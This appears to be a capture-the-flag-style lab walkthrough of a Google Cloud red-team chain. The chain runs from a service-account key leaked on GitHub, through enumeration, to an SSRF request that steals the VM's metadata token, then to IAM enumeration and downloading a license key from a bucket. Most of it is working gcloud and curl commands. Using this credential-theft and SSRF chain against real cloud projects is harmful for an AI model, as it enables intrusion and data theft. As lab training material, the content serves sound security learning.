# 🔐 GCP Red Team Enumeration — CWL MetaTech Lab

### 1. GitHub Reconnaissance

1.  **Search for the organization on GitHub**

    ```bash
    # Use GitHub search or Google dork:
    org:cwl-metatech site:github.com
    ```

    — finds: `https://github.com/cwl-metatech/production-data`
2.  **Download the service‑account key**

    ```bash
    wget https://raw.githubusercontent.com/cwl-metatech/production-data/main/dev-service-account-key.json
    ```

    — saves `dev-service-account-key.json`

***

### 2. Authenticate as Dev Service Account

1.  **Activate the service account in gcloud**

    ```bash
    gcloud auth activate-service-account \
      --key-file=dev-service-account-key.json
    ```
2.  **Verify active account & project**

    ```bash
    gcloud config list
    ```
3.  **Extract project\_id directly (alternative)**

    ```bash
    grep '"project_id"' dev-service-account-key.json
    # "project_id": "alert-nimbus-335411",
    ```

***

### 3. Generate & Save Initial Access Token

1.  **Print OAuth token**

    ```bash
    ACCESS_TOKEN=$(gcloud auth print-access-token)
    echo $ACCESS_TOKEN
    ```
2.  **Save to file**

    ```bash
    echo "$ACCESS_TOKEN" > token.txt
    ```

***

### 4. Check Dev‑Service‑Account Permissions

1.  **Test key permissions via REST API**

    ```bash
    curl -s -X POST \
      -H "Authorization: Bearer $ACCESS_TOKEN" \
      -H "Content-Type: application/json" \
      https://cloudresourcemanager.googleapis.com/v1/projects/alert-nimbus-335411:testIamPermissions \
      -d '{
        "permissions": [
          "compute.instances.get",
          "compute.instances.list",
          "resourcemanager.projects.getIamPolicy",
          "iam.serviceAccounts.get"
        ]
      }'
    ```

    — **Response**: only `"compute.instances.list"`

***

### 5. Enumerate Compute Engine Instances

1.  **List all instances**

    ```bash
    gcloud compute instances list \
      --project=alert-nimbus-335411 \
      --access-token-file=token.txt \
      --format="table(name,zone,internalIP,externalIP,STATUS)"
    ```

    — shows `stag-instance` in `us-central1-b`
2.  **Describe instance JSON**

    ```bash
    gcloud compute instances describe stag-instance \
      --zone=us-central1-b \
      --project=alert-nimbus-335411 \
      --access-token-file=token.txt \
      --format=json > instance.json
    ```

***

### 6. Identify Attached Service Account

```bash
gcloud compute instances describe stag-instance \
  --zone=us-central1-b \
  --project=alert-nimbus-335411 \
  --access-token-file=token.txt \
  --format="value(serviceAccounts.email)"
# vm-service-account@alert-nimbus-335411.iam.gserviceaccount.com
```

***

### 7. Exploit SSRF to Steal VM Token

1.  **Craft SSRF POST**

    ```bash
    curl -s -X POST http://34.28.59.217/process.php \
      -F "url=test" \
      -F "date=2201-02-01" \
      -F "ip=org" \
      -F "organization=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
    ```
2.  **Save the stolen token**

    ```bash
    # Assuming JSON response in stdout:
    curl ... | jq -r .access_token > vm_token.txt
    ```

***

### 8. Enumerate Projects & IAM via Stolen Token

1.  **List accessible projects**

    ```bash
    curl -s -H "Authorization: Bearer $(cat vm_token.txt)" \
         https://cloudresourcemanager.googleapis.com/v1/projects
    ```
2.  **Get project IAM policy**

    ```bash
    curl -s -X POST \
      -H "Authorization: Bearer $(cat vm_token.txt)" \
      -H "Content-Type: application/json" \
      https://cloudresourcemanager.googleapis.com/v1/projects/alert-nimbus-335411:getIamPolicy \
      -d '{}'
    ```

***

### 9. List & Enumerate Service Accounts

1.  **List all SAs**

    ```bash
    gcloud iam service-accounts list \
      --project=alert-nimbus-335411 \
      --access-token-file=vm_token.txt
    ```
2.  **Loop to dump roles for each SA**

    ```bash
    for SA in $(gcloud iam service-accounts list \
        --project=alert-nimbus-335411 \
        --format="value(email)" \
        --access-token-file=vm_token.txt); do
      echo "Roles for $SA:"
      gcloud projects get-iam-policy alert-nimbus-335411 \
        --flatten="bindings[].members" \
        --filter="bindings.members:serviceAccount:$SA" \
        --format="value(bindings.role)" \
        --access-token-file=vm_token.txt
    done
    ```

***

### 10. Identify Custom VMRead\* Role Bindings

```bash
gcloud projects get-iam-policy alert-nimbus-335411 \
  --flatten="bindings[].members" \
  --filter="bindings.role:projects/alert-nimbus-335411/roles/VMReadjw1" \
  --format="value(bindings.members)" \
  --access-token-file=vm_token.txt
# Returns the service accounts with VMReadjw1
```

***

### 11. Enumerate Cloud Storage & Retrieve License Key

1.  **List buckets**

    ```bash
    gcloud storage ls \
      --project=alert-nimbus-335411 \
      --access-token-file=vm_token.txt
    ```

    — includes `gs://stag-storage-metatech/`
2.  **List objects in target bucket**

    ```bash
    gsutil -o "Credentials:access_token=$(cat vm_token.txt)" \
      ls gs://stag-storage-metatech/
    ```
3.  **Download the license**

    ```bash
    gcloud storage cp gs://stag-storage-metatech/license-key.txt . \
      --access-token-file=vm_token.txt
    ```
4.  **View its contents**

    ```bash
    cat license-key.txt
    # <-- shows the license key value
    ```
